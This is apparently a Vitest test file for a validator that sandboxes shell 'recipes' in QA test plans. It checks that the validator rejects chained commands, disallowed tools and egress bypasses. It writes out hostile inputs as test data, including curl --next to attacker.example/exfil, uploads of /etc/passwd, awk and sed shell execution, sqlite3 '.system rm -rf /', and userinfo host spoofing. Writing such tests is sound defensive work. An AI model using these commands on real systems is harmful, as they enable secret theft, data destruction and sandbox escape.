import { describe, it, expect } from "vitest"
import { parseBindings, validateRecipe } from "../../../src/modules/qa/binding-parser.js"

const SAMPLE_PLAN = `
# Test Plan

## Setup

**Required environment variables:**
- \`DATABASE_URL\`

**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — Supabase JWT for the test user
  - Inputs: \`$TEST_USER_EMAIL\`, \`$TEST_USER_PASSWORD\`, \`$SUPABASE_URL\`, \`$ANON_KEY\`
  - Egress: \`$SUPABASE_URL\`
  - Recipe:
    \`\`\`bash
    curl -sS "$SUPABASE_URL/auth/v1/token?grant_type=password" -H "apikey: $ANON_KEY" --data-urlencode "email=$TEST_USER_EMAIL" --data-urlencode "password=$TEST_USER_PASSWORD" | jq -er .access_token
    \`\`\`

- \`QA_BIND_CV_ID\` (plain) — Test CV
  - Inputs: \`$QA_BIND_TOKEN\`, \`$BASE_URL\`
  - Egress: \`$BASE_URL\`
  - Recipe:
    \`\`\`bash
    curl -sS -X POST "$BASE_URL/api/v1/cvs" -H "Authorization: Bearer $QA_BIND_TOKEN" --data-urlencode "name=Test" | jq -er .id
    \`\`\`

## BE Test Scenarios

### BE-01: Some test
- **Steps:** ...
`

describe("parseBindings", () => {
  it("extracts both bindings with correct fields", () => {
    const result = parseBindings(SAMPLE_PLAN)
    expect(result.status).toBe("ok")
    if (result.status !== "ok") return
    expect(result.bindings).toHaveLength(2)

    const token = result.bindings[0]!
    expect(token.name).toBe("QA_BIND_TOKEN")
    expect(token.type).toBe("secret")
    expect(token.inputs).toEqual(["TEST_USER_EMAIL", "TEST_USER_PASSWORD", "SUPABASE_URL", "ANON_KEY"])
    expect(token.egress).toBe("$SUPABASE_URL")
    expect(token.recipe).toContain("curl -sS")
    expect(token.recipe).toContain("jq -er .access_token")

    const cv = result.bindings[1]!
    expect(cv.name).toBe("QA_BIND_CV_ID")
    expect(cv.type).toBe("plain")
    expect(cv.inputs).toEqual(["QA_BIND_TOKEN", "BASE_URL"])
  })

  it("returns ok with empty bindings when no **Bindings:** subsection", () => {
    const result = parseBindings("# Plan\n\n## Setup\n\n**Required environment variables:**\n- \`X\`\n")
    expect(result.status).toBe("ok")
    if (result.status === "ok") {
      expect(result.bindings).toEqual([])
    }
  })

  it("rejects binding name not matching QA_BIND_*", () => {
    const plan = `
## Setup
**Bindings:**
- \`MY_TOKEN\` (secret) — bad
  - Inputs: \`$X\`
  - Egress: \`$X\`
  - Recipe:
    \`\`\`bash
    echo hi
    \`\`\`
`
    const result = parseBindings(plan)
    expect(result.status).toBe("error")
    if (result.status === "error") {
      expect(result.reason).toMatch(/QA_BIND_/)
    }
  })

  it("rejects recipe with $NAME not declared in Inputs", () => {
    const plan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$X\`
  - Egress: \`$X\`
  - Recipe:
    \`\`\`bash
    curl "$X/$UNDECLARED"
    \`\`\`
`
    const result = parseBindings(plan)
    expect(result.status).toBe("error")
    if (result.status === "error") {
      expect(result.reason).toMatch(/UNDECLARED/)
    }
  })

  it("rejects binding without Recipe block", () => {
    const plan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$X\`
  - Egress: \`$X\`
`
    const result = parseBindings(plan)
    expect(result.status).toBe("error")
    if (result.status === "error") {
      expect(result.reason).toMatch(/[Rr]ecipe/)
    }
  })

  // MAINT-007: Recipe deindent must use textwrap.dedent semantics so plans
  // authored with 2-space, tab, or otherwise non-4-space indentation still
  // parse cleanly. The resulting recipe field must not carry leading
  // whitespace that would corrupt firstWord extraction in validateRecipe.
  it("dedents recipe with 2-space indentation", () => {
    const plan = [
      "## Setup",
      "**Bindings:**",
      "- `QA_BIND_TOKEN` (secret) — token",
      "  - Inputs: `$URL`",
      "  - Egress: `$URL`",
      "  - Recipe:",
      "    ```bash",
      `    curl -sS "$URL" | jq -er .access_token`,
      "    ```",
      "",
    ].join("\n")
    const result = parseBindings(plan)
    expect(result.status).toBe("ok")
    if (result.status !== "ok") return
    expect(result.bindings).toHaveLength(1)
    const recipe = result.bindings[0]!.recipe
    expect(recipe.startsWith(" ")).toBe(false)
    expect(recipe.startsWith("\t")).toBe(false)
    expect(recipe).toBe(`curl -sS "$URL" | jq -er .access_token`)
  })

  it("dedents recipe with tab indentation", () => {
    // Build with explicit tabs to ensure the fence/recipe share the same prefix.
    const plan = [
      "## Setup",
      "**Bindings:**",
      "- `QA_BIND_TOKEN` (secret) — token",
      "\t- Inputs: `$URL`",
      "\t- Egress: `$URL`",
      "\t- Recipe:",
      "\t\t```bash",
      `\t\tcurl -sS "$URL" | jq -er .access_token`,
      "\t\t```",
      "",
    ].join("\n")
    const result = parseBindings(plan)
    expect(result.status).toBe("ok")
    if (result.status !== "ok") return
    const recipe = result.bindings[0]!.recipe
    expect(recipe.startsWith(" ")).toBe(false)
    expect(recipe.startsWith("\t")).toBe(false)
    expect(recipe).toBe(`curl -sS "$URL" | jq -er .access_token`)
  })
})

describe("validateRecipe — single-statement constraint (Rule 1)", () => {
  it("accepts a single-pipe pipeline", () => {
    expect(validateRecipe(`curl "$URL" | jq -er .x`, "$URL").status).toBe("ok")
  })
  it("rejects ; chained statements", () => {
    expect(validateRecipe(`curl "$URL"; rm /tmp/x`, "$URL").status).toBe("error")
  })
  it("rejects && chained statements", () => {
    expect(validateRecipe(`curl "$URL" && curl "http://evil"`, "$URL").status).toBe("error")
  })
  it("rejects || chained statements", () => {
    expect(validateRecipe(`curl "$URL" || curl "http://evil"`, "$URL").status).toBe("error")
  })
  it("rejects newline-separated statements", () => {
    expect(validateRecipe(`curl "$URL"\ncurl "http://evil"`, "$URL").status).toBe("error")
  })
  it("accepts \\<newline> line continuation as single statement", () => {
    expect(validateRecipe(`curl "$URL" \\\n  -H "X: y" | jq -er .x`, "$URL").status).toBe("ok")
  })
})

describe("validateRecipe — operator allowlist (Rule 2)", () => {
  it("rejects $() command substitution", () => {
    expect(validateRecipe(`curl "$URL" -d "$(cat /etc/passwd)"`, "$URL").status).toBe("error")
  })
  it("rejects backticks", () => {
    expect(validateRecipe('curl "$URL" -d "`cat /etc/passwd`"', "$URL").status).toBe("error")
  })
  it("rejects heredoc <<", () => {
    expect(validateRecipe(`cat <<EOF\nx\nEOF`, "$URL").status).toBe("error")
  })
  it("rejects > redirect to non-/dev/null", () => {
    expect(validateRecipe(`curl "$URL" > /tmp/leak`, "$URL").status).toBe("error")
  })
  it("accepts 2>/dev/null", () => {
    expect(validateRecipe(`curl "$URL" 2>/dev/null | jq -er .x`, "$URL").status).toBe("ok")
  })
  it("rejects & background", () => {
    expect(validateRecipe(`curl "$URL" &`, "$URL").status).toBe("error")
  })
})

describe("validateRecipe — command allowlist (Rule 3)", () => {
  it("rejects unknown command (wget)", () => {
    expect(validateRecipe(`wget "$URL"`, "$URL").status).toBe("error")
  })
  it("rejects bash invocation", () => {
    expect(validateRecipe(`bash -c "curl $URL"`, "$URL").status).toBe("error")
  })
  it("accepts curl + jq pipeline", () => {
    expect(validateRecipe(`curl "$URL" | jq -er .x`, "$URL").status).toBe("ok")
  })
})

describe("validateRecipe — curl flag denylist", () => {
  it("rejects --upload-file", () => {
    expect(validateRecipe(`curl --upload-file /etc/passwd "$URL"`, "$URL").status).toBe("error")
  })
  it("rejects -T file", () => {
    expect(validateRecipe(`curl -T /etc/passwd "$URL"`, "$URL").status).toBe("error")
  })
  it("rejects -d @file", () => {
    expect(validateRecipe(`curl -d @/etc/passwd "$URL"`, "$URL").status).toBe("error")
  })
  it("rejects --data @file", () => {
    expect(validateRecipe(`curl --data @secrets.txt "$URL"`, "$URL").status).toBe("error")
  })
  it("rejects -o non-null", () => {
    expect(validateRecipe(`curl -o /tmp/x "$URL"`, "$URL").status).toBe("error")
  })
  it("accepts -o /dev/null", () => {
    expect(validateRecipe(`curl -o /dev/null "$URL"`, "$URL").status).toBe("ok")
  })
  it("accepts --data-urlencode 'inline'", () => {
    expect(validateRecipe(`curl --data-urlencode "email=$X" "$URL"`, "$URL").status).toBe("ok")
  })
})

describe("validateRecipe — Egress URL match (Rule 4)", () => {
  it("accepts curl to declared Egress host", () => {
    expect(validateRecipe(`curl "$URL/path" | jq -er .x`, "$URL").status).toBe("ok")
  })
  it("rejects curl to a different literal host", () => {
    expect(validateRecipe(`curl "https://evil.example/path"`, "$URL").status).toBe("error")
  })
  it("rejects curl to a different $VAR host when Egress is $URL", () => {
    expect(validateRecipe(`curl "$OTHER/path"`, "$URL").status).toBe("error")
  })
})

describe("parseBindings + validateRecipe integration", () => {
  it("parseBindings rejects plan with invalid recipe", () => {
    const plan = `
## Setup
**Bindings:**
- \`QA_BIND_TOKEN\` (secret) — bad
  - Inputs: \`$URL\`
  - Egress: \`$URL\`
  - Recipe:
    \`\`\`bash
    curl "$URL" && wget "http://evil"
    \`\`\`
`
    const result = parseBindings(plan)
    expect(result.status).toBe("error")
  })
})

// =============================================================================
// COMP-002: Sandbox bypass regression tests.
//
// Each block below corresponds to one of the four bypass classes documented in
// the code review: SEC-002 (curl --next), SEC-003 (awk/sed shell-exec), SEC-004
// (DSN egress), SEC-005 (file-reader path confinement), plus SEC-008 (recipe
// length DoS). Each test MUST fail against the pre-fix code and pass after the
// remediation. Do not delete or weaken without security review.
// =============================================================================

describe("validateRecipe — SEC-002: curl --next bypass", () => {
  it("rejects curl --next chaining a second request", () => {
    // --next lets curl issue a second request to an arbitrary host AFTER the
    // first URL passes the egress check. The extractCurlURL helper only
    // inspects the first non-flag token.
    expect(
      validateRecipe(
        `curl -sS "$URL/api" --next "https://attacker.example/exfil"`,
        "$URL",
      ).status,
    ).toBe("error")
  })

  it("rejects curl --url that points outside the declared Egress", () => {
    // --url is an alternative way to specify the request target; when it
    // appears AFTER an allowlisted URL it lets a recipe smuggle in a second
    // host.
    expect(
      validateRecipe(
        `curl -sS "$URL/api" --url "https://attacker.example/exfil"`,
        "$URL",
      ).status,
    ).toBe("error")
  })
})

describe("validateRecipe — SEC-003: awk/sed shell-exec primitives", () => {
  it("rejects awk entirely (BEGIN{system(...)} executes shell)", () => {
    expect(
      validateRecipe(`awk 'BEGIN{system("echo PWNED")}'`, "$URL").status,
    ).toBe("error")
  })

  it("rejects sed entirely (e cmd / W flag execute shell)", () => {
    expect(
      validateRecipe(`sed 'e curl https://attacker.example'`, "$URL").status,
    ).toBe("error")
  })

  it("rejects awk when piped from an allowed command", () => {
    expect(
      validateRecipe(
        `curl "$URL" | awk 'BEGIN{system("id")}'`,
        "$URL",
      ).status,
    ).toBe("error")
  })

  it("rejects sed when piped from an allowed command", () => {
    expect(
      validateRecipe(`curl "$URL" | sed 's/x/y/'`, "$URL").status,
    ).toBe("error")
  })
})

describe("validateRecipe — SEC-004: DSN egress validation", () => {
  it("rejects psql with a DSN pointing to a non-Egress host", () => {
    expect(
      validateRecipe(
        `psql "postgres://attacker.example:5432/db"`,
        "$DATABASE_URL",
      ).status,
    ).toBe("error")
  })

  it("accepts psql when the DSN matches the declared Egress", () => {
    expect(
      validateRecipe(`psql "$DATABASE_URL" -c "select 1"`, "$DATABASE_URL").status,
    ).toBe("ok")
  })

  it("rejects sqlite3 .read dot-command (executes SQL from arbitrary file)", () => {
    expect(
      validateRecipe(`sqlite3 ./local.db ".read /etc/passwd"`, "./local.db").status,
    ).toBe("error")
  })

  it("rejects sqlite3 .shell dot-command", () => {
    expect(
      validateRecipe(`sqlite3 ./local.db ".shell id"`, "./local.db").status,
    ).toBe("error")
  })

  it("rejects sqlite3 .system dot-command", () => {
    expect(
      validateRecipe(`sqlite3 ./local.db ".system rm -rf /"`, "./local.db").status,
    ).toBe("error")
  })
})

describe("validateRecipe — SEC-001: egress allowlist bypass via URL userinfo", () => {
  it("rejects a curl URL whose userinfo spoofs the Egress host", () => {
    // `https://api.host.com@evil.com/x` resolves to host `evil.com`; the
    // userinfo segment `api.host.com` must NOT be treated as the host.
    expect(
      validateRecipe("curl https://api.host.com@evil.com/x", "https://api.host.com").status,
    ).toBe("error")
  })

  it("rejects userinfo with a password component", () => {
    expect(
      validateRecipe("curl https://egress.example.com:pw@attacker.com/?d=x", "https://egress.example.com").status,
    ).toBe("error")
  })

  it("rejects a psql DSN whose userinfo spoofs the Egress host", () => {
    expect(
      validateRecipe("psql postgres://db.host.com@attacker.example/db", "postgres://db.host.com").status,
    ).toBe("error")
  })

  it("still accepts a plain curl URL that matches the declared Egress host", () => {
    expect(
      validateRecipe("curl https://api.host.com/x", "https://api.host.com").status,
    ).toBe("ok")
  })
})

describe("validateRecipe — SEC-005: file-reader path confinement", () => {
  it("rejects tail of an absolute system path", () => {
    expect(validateRecipe(`tail /etc/passwd`, "$URL").status).toBe("error")
  })

  it("rejects head of an absolute system path", () => {
    expect(validateRecipe(`head /etc/shadow`, "$URL").status).toBe("error")
  })

  it("rejects cut on an absolute system path", () => {
    expect(
      validateRecipe(`cut -d: -f1 /etc/passwd`, "$URL").status,
    ).toBe("error")
  })

  it("rejects grep on an absolute system path", () => {
    expect(validateRecipe(`grep root /etc/passwd`, "$URL").status).toBe("error")
  })

  it("rejects tr reading an absolute system path", () => {
    expect(
      validateRecipe(`tr a-z A-Z < /etc/hostname`, "$URL").status,
    ).toBe("error")
  })

  it("accepts file-reader with no path argument (stdin pipeline)", () => {
    expect(
      validateRecipe(`curl "$URL" | head -n 1`, "$URL").status,
    ).toBe("ok")
  })

  it("accepts file-reader on a ./ relative path", () => {
    expect(validateRecipe(`tail ./fixture.txt`, "$URL").status).toBe("ok")
  })

  it("accepts file-reader on /dev/null / /dev/stdin / -", () => {
    expect(validateRecipe(`head /dev/null`, "$URL").status).toBe("ok")
    expect(validateRecipe(`cat /dev/stdin`, "$URL").status).toBe("error") // cat not allowed at all
    expect(validateRecipe(`tail -`, "$URL").status).toBe("ok")
  })
})

describe("validateRecipe — SEC-008: recipe length cap (regex DoS)", () => {
  it("rejects recipes longer than 16 KB", () => {
    // 16 KB + a token — exact cap is implementation detail, we just need a
    // large input to be rejected before the regex pipeline scans it.
    const huge = "curl \"$URL\" -H \"" + "x".repeat(20_000) + "\""
    const result = validateRecipe(huge, "$URL")
    expect(result.status).toBe("error")
    if (result.status === "error") {
      expect(result.reason).toMatch(/too long|length|size/i)
    }
  })

  it("accepts recipes well under the cap", () => {
    expect(
      validateRecipe(`curl "$URL" | jq -er .x`, "$URL").status,
    ).toBe("ok")
  })
})
